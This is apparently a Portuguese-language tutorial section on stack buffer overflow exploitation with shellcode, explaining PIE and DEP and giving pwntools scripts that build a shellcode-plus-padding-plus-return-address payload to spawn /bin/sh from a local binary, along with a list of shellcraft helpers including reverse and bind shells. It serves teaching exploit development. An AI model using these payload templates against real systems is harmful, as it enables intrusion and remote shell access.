## 2.4 Buffer Overflow - Shellcode

Shell Code é um **pequeno trecho de código em Assembly usado como payload (carga útil) em um ataque**. O código é muito pequeno por ser em assembly, portanto apenas poucos bytes são necessários, dependendo do shellcode.

Com shellcode, **fazemos o programa rodar funcionalidades que o programador não escreveu**. Normalmente, shellcode é utilizado para fazer uma chamada de API do Windows ou Syscall no Linux.

No C, estaríamos fazendo algo como:

```C
int main() {
    system("/bin/sh"); // Chama shell
    return 0;
}
```

O Shellcode é a versão compacta disso, em assembly, que pode ser injetada na memória através de um input. Ou seja, **Shellcode é código Assembly normal**, nada especial.

A razão pela qual Shellcode possui sucesso é por que **o computador não diferencia dados e instruções**. Não importa onde ou como você fala para rodar, o computador VAI tentar rodar. Assim, mesmo que nosso input seja apenas dados, o computador não sabe disso.

### 2.4.1 Inimigos do Shellcode: PIE e DEP

PIE (Position-Independent Executables) é uma técnica de segurança que randomiza a memória do programa. Para realizar shellcode, precisamos saber exatamente o que vamos fazer. O PIE pode ser burlado se você conseguir vazar os endereços de memória que precisa, mas isso não vem ao caso agora.

A outra proteção é o DEP (Data Execution Prevention). Esse é mais mortal, pois impede que áreas da memória que deveriam conter apenas dados (stack, heap) sejam executadas como código. O que contorna isso são os ataques de ROP. Ou seja, nada de injetar código novo, só podemos reaproveitar o que já existe no código.

### 2.4.2 Usando BOF Shellcode

Basicamente:

1. Identifique se é possível fazer BOF
2. Coloque o **Shellcode no Input** + **Padding até `return address`** + **Endereço do início do Shellcode na stack**
3. Sim, acabamos de mandar o `RIP` executar instrução na stack.

Exemplo com pwntools, abrindo uma shell (`shellcraft.sh()`):

```py
from pwn import *

context.binary = ELF('./program')

p = process()

payload = asm(shellcraft.sh())          # Shellcode
payload = payload.ljust(312, b'A')      # Padding
payload += p32(0xffffcfb4)              # Endereço do Shellcode

log.info(p.clean())

p.sendline(payload)

p.interactive()
```


### 2.4.4 ShellCode + pwntools

```py
# Shellcodes prontos populares
shellcraft.sh()           # /bin/sh
shellcraft.cat('file')    # cat file
shellcraft.dupsh()        # Duplica shell para fd
shellcraft.echo('text')   # Imprime texto
shellcraft.exit()         # Sai do processo
shellcraft.findpeersh()   # Encontra peer shell

# Redes
shellcraft.connect('ip', port)
shellcraft.bindsh(port)
shellcraft.reverse('ip', port)

# Sistema de arquivos
shellcraft.getdents(fd)
shellcraft.getcwd()
```

Exemplo: 

```py
#!/usr/bin/env python3
from pwn import *

# Configurar
context.binary = ELF('./program')

p = process()

print("Gerando shellcode /bin/sh...")

# Gerar shellcode
shellcode = asm(shellcraft.sh())

print(f"Shellcode: {len(shellcode)} bytes")
print(hexdump(shellcode))

# Disassemblar para ver as instruções
print("\\nInstruções Assembly:")
print(disasm(shellcode))

# Testar (opcional - descomente para executar)
# print("\\n🚀 Executando shellcode...")
# p = run_shellcode(shellcode)
# p.interactive()
```
